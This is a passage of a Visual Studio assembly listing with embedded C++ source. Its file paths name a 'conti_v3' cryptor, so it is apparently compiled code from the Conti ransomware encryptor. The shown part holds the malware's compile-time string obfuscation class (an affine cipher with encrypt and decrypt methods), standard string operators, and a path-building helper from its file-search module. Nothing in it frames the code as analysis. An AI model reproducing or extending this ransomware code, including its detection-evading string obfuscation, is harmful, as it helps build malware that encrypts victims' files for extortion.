; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv94 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000dd	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  000e1	88 85 c0 00 00
	00		 mov	 BYTE PTR tv94[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  000e7	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000ee	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  000f5	5f		 pop	 rdi
  000f6	5d		 pop	 rbp
  000f7	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z
_TEXT	SEGMENT
__$ReturnUdt$ = 224
_Left$ = 232
_Right$ = 240
??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z PROC ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 4998 :     basic_string<_Elem, _Traits, _Alloc>&& _Left, const basic_string<_Elem, _Traits, _Alloc>& _Right) {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4999 :     return _STD move(_Left.append(_Right));

  00029	48 8b 95 f0 00
	00 00		 mov	 rdx, QWORD PTR _Right$[rbp]
  00030	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Left$[rbp]
  00037	e8 00 00 00 00	 call	 ?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
  0003c	48 8b d0	 mov	 rdx, rax
  0003f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR __$ReturnUdt$[rbp]
  00046	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0004b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR __$ReturnUdt$[rbp]

; 5000 : }

  00052	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00059	5f		 pop	 rdi
  0005a	5d		 pop	 rbp
  0005b	c3		 ret	 0
??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z ENDP ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z
_TEXT	SEGMENT
_Left_size$ = 8
_Right_size$ = 40
$T1 = 260
$T2 = 292
$T3 = 324
tv86 = 344
tv89 = 352
__$ReturnUdt$ = 400
_Left$ = 408
_Right$ = 416
??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z PROC ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 4932 :     const basic_string<_Elem, _Traits, _Alloc>& _Left, const basic_string<_Elem, _Traits, _Alloc>& _Right) {

$LN4:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec b8 01
	00 00		 sub	 rsp, 440		; 000001b8H
  00018	48 8d 6c 24 40	 lea	 rbp, QWORD PTR [rsp+64]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4933 :     const auto _Left_size  = _Left.size();

  00029	48 8b 8d 98 01
	00 00		 mov	 rcx, QWORD PTR _Left$[rbp]
  00030	e8 00 00 00 00	 call	 ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
  00035	48 89 45 08	 mov	 QWORD PTR _Left_size$[rbp], rax

; 4934 :     const auto _Right_size = _Right.size();

  00039	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00040	e8 00 00 00 00	 call	 ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
  00045	48 89 45 28	 mov	 QWORD PTR _Right_size$[rbp], rax

; 4935 :     if (_Left.max_size() - _Left_size < _Right_size) {

  00049	48 8b 8d 98 01
	00 00		 mov	 rcx, QWORD PTR _Left$[rbp]
  00050	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00055	48 2b 45 08	 sub	 rax, QWORD PTR _Left_size$[rbp]
  00059	48 3b 45 28	 cmp	 rax, QWORD PTR _Right_size$[rbp]
  0005d	73 05		 jae	 SHORT $LN2@operator

; 4936 :         _Xlen_string();

  0005f	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@operator:

; 4937 :     }
; 4938 : 
; 4939 :     return {_String_constructor_concat_tag{}, _Left, _Left.c_str(), _Left_size, _Right.c_str(), _Right_size};

  00064	0f b6 85 04 01
	00 00		 movzx	 eax, BYTE PTR $T1[rbp]
  0006b	88 85 24 01 00
	00		 mov	 BYTE PTR $T2[rbp], al
  00071	0f b6 85 24 01
	00 00		 movzx	 eax, BYTE PTR $T2[rbp]
  00078	88 85 44 01 00
	00		 mov	 BYTE PTR $T3[rbp], al
  0007e	48 8b 8d 98 01
	00 00		 mov	 rcx, QWORD PTR _Left$[rbp]
  00085	e8 00 00 00 00	 call	 ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
  0008a	48 89 85 58 01
	00 00		 mov	 QWORD PTR tv86[rbp], rax
  00091	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00098	e8 00 00 00 00	 call	 ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
  0009d	48 89 85 60 01
	00 00		 mov	 QWORD PTR tv89[rbp], rax
  000a4	48 8b 45 28	 mov	 rax, QWORD PTR _Right_size$[rbp]
  000a8	48 89 44 24 30	 mov	 QWORD PTR [rsp+48], rax
  000ad	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR tv89[rbp]
  000b4	48 89 44 24 28	 mov	 QWORD PTR [rsp+40], rax
  000b9	48 8b 45 08	 mov	 rax, QWORD PTR _Left_size$[rbp]
  000bd	48 89 44 24 20	 mov	 QWORD PTR [rsp+32], rax
  000c2	4c 8b 8d 58 01
	00 00		 mov	 r9, QWORD PTR tv86[rbp]
  000c9	4c 8b 85 98 01
	00 00		 mov	 r8, QWORD PTR _Left$[rbp]
  000d0	0f b6 95 44 01
	00 00		 movzx	 edx, BYTE PTR $T3[rbp]
  000d7	48 8b 8d 90 01
	00 00		 mov	 rcx, QWORD PTR __$ReturnUdt$[rbp]
  000de	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  000e3	48 8b 85 90 01
	00 00		 mov	 rax, QWORD PTR __$ReturnUdt$[rbp]

; 4940 : }

  000ea	48 8d a5 78 01
	00 00		 lea	 rsp, QWORD PTR [rbp+376]
  000f1	5f		 pop	 rdi
  000f2	5d		 pop	 rbp
  000f3	c3		 ret	 0
??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z ENDP ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
;	COMDAT ?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z
_TEXT	SEGMENT
t$ = 4
$T5 = 328
$T6 = 360
$T7 = 420
$T8 = 456
$T9 = 520
$T10 = 580
tv131 = 600
tv73 = 608
__$ReturnUdt$ = 656
Directory$ = 664
Filename$ = 672
?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z PROC ; MakePath, COMDAT

; 32   : {

$LN8:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 98 02
	00 00		 sub	 rsp, 664		; 00000298H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00022	b9 6e 00 00 00	 mov	 ecx, 110		; 0000006eH
  00027	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0002c	f3 ab		 rep stosd
  0002e	48 8b 8c 24 b8
	02 00 00	 mov	 rcx, QWORD PTR [rsp+696]
  00036	c7 85 44 02 00
	00 00 00 00 00	 mov	 DWORD PTR $T10[rbp], 0
  00040	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__A3B0747C_search@cpp
  00047	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 33   : 	WCHAR t = Directory[Directory.length() - 1];

  0004c	48 8b 8d 98 02
	00 00		 mov	 rcx, QWORD PTR Directory$[rbp]
  00053	e8 00 00 00 00	 call	 ?length@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::length
  00058	48 ff c8	 dec	 rax
  0005b	48 8b d0	 mov	 rdx, rax
  0005e	48 8b 8d 98 02
	00 00		 mov	 rcx, QWORD PTR Directory$[rbp]
  00065	e8 00 00 00 00	 call	 ??A?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator[]
  0006a	0f b7 00	 movzx	 eax, WORD PTR [rax]
  0006d	66 89 45 04	 mov	 WORD PTR t$[rbp], ax

; 34   : 	std::wstring Path = t == L'\\' ? Directory + Filename : Directory + OBFW(L"\\") + Filename;

  00071	0f b7 45 04	 movzx	 eax, WORD PTR t$[rbp]
  00075	83 f8 5c	 cmp	 eax, 92			; 0000005cH
  00078	75 2a		 jne	 SHORT $LN3@MakePath
  0007a	4c 8b 85 a0 02
	00 00		 mov	 r8, QWORD PTR Filename$[rbp]
  00081	48 8b 95 98 02
	00 00		 mov	 rdx, QWORD PTR Directory$[rbp]
  00088	48 8d 8d 68 01
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  0008f	e8 00 00 00 00	 call	 ??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00094	83 8d 44 02 00
	00 01		 or	 DWORD PTR $T10[rbp], 1
  0009b	48 89 85 58 02
	00 00		 mov	 QWORD PTR tv131[rbp], rax
  000a2	eb 5c		 jmp	 SHORT $LN4@MakePath
$LN3@MakePath:
  000a4	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_13FPGAJAPJ@?$AA?2@
  000ab	48 8d 8d a4 01
	00 00		 lea	 rcx, QWORD PTR $T7[rbp]
  000b2	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >
  000b7	48 8b c8	 mov	 rcx, rax
  000ba	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
  000bf	4c 8b c0	 mov	 r8, rax
  000c2	48 8b 95 98 02
	00 00		 mov	 rdx, QWORD PTR Directory$[rbp]
  000c9	48 8d 8d c8 01
	00 00		 lea	 rcx, QWORD PTR $T8[rbp]
  000d0	e8 00 00 00 00	 call	 ??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  000d5	83 8d 44 02 00
	00 02		 or	 DWORD PTR $T10[rbp], 2
  000dc	4c 8b 85 a0 02
	00 00		 mov	 r8, QWORD PTR Filename$[rbp]
  000e3	48 8b d0	 mov	 rdx, rax
  000e6	48 8d 8d 08 02
	00 00		 lea	 rcx, QWORD PTR $T9[rbp]
  000ed	e8 00 00 00 00	 call	 ??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  000f2	83 8d 44 02 00
	00 04		 or	 DWORD PTR $T10[rbp], 4
  000f9	48 89 85 58 02
	00 00		 mov	 QWORD PTR tv131[rbp], rax
$LN4@MakePath:
  00100	48 8b 85 58 02
	00 00		 mov	 rax, QWORD PTR tv131[rbp]
  00107	48 89 85 48 01
	00 00		 mov	 QWORD PTR $T5[rbp], rax
  0010e	48 8b 95 48 01
	00 00		 mov	 rdx, QWORD PTR $T5[rbp]
  00115	48 8b 8d 90 02
	00 00		 mov	 rcx, QWORD PTR __$ReturnUdt$[rbp]
  0011c	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00121	48 89 85 60 02
	00 00		 mov	 QWORD PTR tv73[rbp], rax
  00128	8b 85 44 02 00
	00		 mov	 eax, DWORD PTR $T10[rbp]
  0012e	83 e0 04	 and	 eax, 4
  00131	85 c0		 test	 eax, eax
  00133	74 13		 je	 SHORT $LN5@MakePath
  00135	83 a5 44 02 00
	00 fb		 and	 DWORD PTR $T10[rbp], -5
  0013c	48 8d 8d 08 02
	00 00		 lea	 rcx, QWORD PTR $T9[rbp]
  00143	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
$LN5@MakePath:
  00148	8b 85 44 02 00
	00		 mov	 eax, DWORD PTR $T10[rbp]
  0014e	83 e0 02	 and	 eax, 2
  00151	85 c0		 test	 eax, eax
  00153	74 13		 je	 SHORT $LN6@MakePath
  00155	83 a5 44 02 00
	00 fd		 and	 DWORD PTR $T10[rbp], -3
  0015c	48 8d 8d c8 01
	00 00		 lea	 rcx, QWORD PTR $T8[rbp]
  00163	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
$LN6@MakePath:
  00168	8b 85 44 02 00
	00		 mov	 eax, DWORD PTR $T10[rbp]
  0016e	83 e0 01	 and	 eax, 1
  00171	85 c0		 test	 eax, eax
  00173	74 13		 je	 SHORT $LN7@MakePath
  00175	83 a5 44 02 00
	00 fe		 and	 DWORD PTR $T10[rbp], -2
  0017c	48 8d 8d 68 01
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  00183	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
$LN7@MakePath:

; 35   : 	return Path;

  00188	48 8b 8d 98 02
	00 00		 mov	 rcx, QWORD PTR Directory$[rbp]
  0018f	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00194	48 8b 8d a0 02
	00 00		 mov	 rcx, QWORD PTR Filename$[rbp]
  0019b	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  001a0	48 8b 85 90 02
	00 00		 mov	 rax, QWORD PTR __$ReturnUdt$[rbp]

; 36   : }

  001a7	48 8b f8	 mov	 rdi, rax
  001aa	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  001ae	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z$rtcFrameData
  001b5	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  001ba	48 8b c7	 mov	 rax, rdi
  001bd	48 8d a5 78 02
	00 00		 lea	 rsp, QWORD PTR [rbp+632]
  001c4	5f		 pop	 rdi
  001c5	5d		 pop	 rbp
  001c6	c3		 ret	 0
?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z ENDP ; MakePath
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
